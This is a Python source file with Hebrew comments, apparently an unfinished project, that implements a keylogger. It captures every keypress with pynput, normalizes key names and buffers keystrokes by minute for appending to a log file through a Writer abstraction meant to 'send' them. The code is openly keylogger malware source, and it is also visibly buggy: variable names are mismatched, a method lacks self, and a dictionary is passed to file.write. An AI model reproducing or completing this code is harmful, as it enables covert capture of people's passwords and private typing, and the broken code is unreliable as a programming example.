from abc import ABC,abstractmethod
from pynput.keyboard import Key,Listener
import sys
from datetime import datetime

# קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
class KeyLogger:
    def __init__(self):
        # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
        def __on_press(Key):
            key_nise = self.nurmal_key(key)
            (key_nise)

        def on_release(key):
            try:
                if key.char == '\x04':  # Ctrl+D
                    print("Exiting...")
                    sys.exit(0)
            except AttributeError:
                pass

#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
        with Listener(on_press=__on_press, on_release=on_release) as listener:
            listener.join()

    # אחראי ליפות את המקש
    def nurmal_key(key):
            key_nise = str(key)
            key_list = list(key_nise)
            if len(key_list) > 3:
                key_nise = ""
                for i in key_list[4:]:
                    key_nise += i
                key_nise = " " + key_nise + " "
                if key_nise == " space ":
                    return " "
                # if key_nise == " enter ":
                #     return "\n"
                # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
                return key_nise
            else:
                return key_list[1]





class Writer(ABC):
    @abstractmethod
    def write(key: str):
        pass
    @abstractmethod
    def send(buffer):
        pass



#  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
# .מחלקת כתיבה לקובץ. מקבלת נתיב של הקובץ
# .מתודת כתוב: כותבת הקשות מקלדת למילון ששומר דקות וטקסט 
# מתודת שלח: שולחת את המילון לקובץ.
class FileWriter(Writer):
    def __init__(self, file_path):
        self.text_dict = {}
        self.cur_min = datetime.now().strftime('%Y-%m-%d %H:%M')
        self.file_path = file_path
    def write(self, key: str):
        if self.cur_min not in self.text_dict:
            self.text_dict[self.cur_min] = key
        else:
            self.text_dict[self.cur_min] += key
    def send(self, buffer):
        with open(self.file_path, "a") as file:
            file.write(self.text_dict)


        
class Manager:
    pass
